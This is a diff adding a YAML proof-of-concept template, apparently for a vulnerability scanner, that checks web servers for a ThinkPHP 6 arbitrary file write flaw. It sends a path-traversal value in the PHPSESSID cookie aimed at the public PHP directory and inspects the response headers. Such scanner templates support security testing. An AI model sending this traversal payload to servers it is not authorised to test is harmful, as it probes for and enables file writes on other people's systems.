@@ -1,0 +1,26 @@
+id: poc-yaml-thinkphp6-file-write
+info:
+  name: ThinkPHP 6 任意文件写入漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件写入
+  finger: ThinkPHP
+  osprey-id: vb_2020_0007
+variables:
+  r_str: random_str(9)
+requests:
+- method: GET
+  path: /
+  headers:
+    Cookie: PHPSESSID=../../../../public/{{.r_str}}.php
+  expression: 'status_code == 200 &&
+
+    contains(headers, "set-cookie") &&
+
+    contains(headers, r_str) &&
+
+    contains(body, "{") && !contains(body, "<")
+
+    '
+transport: http
